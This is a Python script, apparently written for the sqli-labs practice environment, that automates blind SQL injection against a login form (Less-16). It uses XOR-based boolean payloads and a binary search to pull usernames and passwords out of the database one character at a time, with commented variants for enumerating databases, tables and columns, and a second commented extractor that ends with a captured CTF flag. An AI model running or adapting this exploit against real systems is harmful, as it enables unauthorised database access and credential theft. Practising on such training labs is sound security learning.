import time
import sys
import requests


def getPayload(result_index, char_index, ascii):


	# select_str = "select database()" #DIY地址
	# select_str = "select schema_name from information_schema.schemata limit "+str(result_index)+" ,1" #DIY地址,获取所有的数据库
	# select_str = "select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+" ,1" #DIY地址,获取某个数据库中的所有表
	# select_str = "select column_name from information_schema.columns where table_schema='security' and table_name='users' limit "+str(result_index)+" ,1" #DIY地址,某张表中所有的字段名称
	select_str = "select concat(username,'~',password) from security.users limit "+str(result_index)+" ,1" #获取表中的内容
	# 连接payload
	sqli_str = '1")^(ascii(mid(('+ select_str +")," + str(char_index) + ",1))>" + str(ascii) + ")#" #DIY地址,获取所有的数据库
	# print(sqli_str)
	payload = {"uname":sqli_str,
			   "passwd":"aaa",
			   "submit":"Submit"
			   }  #DIY地址

	return payload


def execute(result_index, char_index, ascii):
	# 连接url
	url = "http://localhost/sqli-labs/Less-16/"  #DIY地址
	payload = getPayload(result_index, char_index, ascii)
	# print(payload)
	# 检查回显
	echo = "flag.jpg"            #DIY地址
	content = requests.post(url, data=payload).text
	# print(content)
	time.sleep(0.1)
	# print(content)
	if echo in content:
		return True
	else:
		return False


def dichotomy(result_index, char_index, left, right):
	while left < right:
		# 二分法
		ascii = int((left + right) / 2)
		if execute(str(result_index), str(char_index + 1), str(ascii)):
			left = ascii
		else:
			right = ascii
		# 结束二分
		if left == right - 1:
			if execute(str(result_index), str(char_index + 1), str(ascii)):
				ascii += 1
				break
			else:
				break
	return chr(ascii)


if __name__ == "__main__":
	for num in range(32):  # 查询结果的数量  #DIY地址
		count = 0
		for len in range(32):  # 单条查询结果的长度   #DIY地址
			count += 1
			char = dichotomy(num, len, 30, 126)
			if ord(char) == 31:  # 单条查询结果已被遍历
				break
			sys.stdout.write(char)
			sys.stdout.flush()
		if count == 1:  # 查询结果已被遍历
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

#
# url = "http://localhost/sqli-labs/Less-15/index.php"
# payload = {
# 	"id" : ""
# }
# result = ""
# for i in range(1,100):
# 	l = 33
# 	r =130
# 	mid = (l+r)>>1
# 	while(l<r):
# 		payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
# 		html = requests.post(url,data=payload)
# 		print(payload)
# 		if "Hello" in html.text:
# 			l = mid+1
# 		else:
# 			r = mid
# 		mid = (l+r)>>1
# 	if(chr(mid)==" "):
# 		break
# 	result = result + chr(mid)
# 	print(result)
# 	time.sleep(0.5)
# print("flag: " ,result)
# flag{03d40c1d-e11b-4e45-af82-054427ff3501}
# flag{03d40c1d-e11b-4e45-af82-054427ff3501}
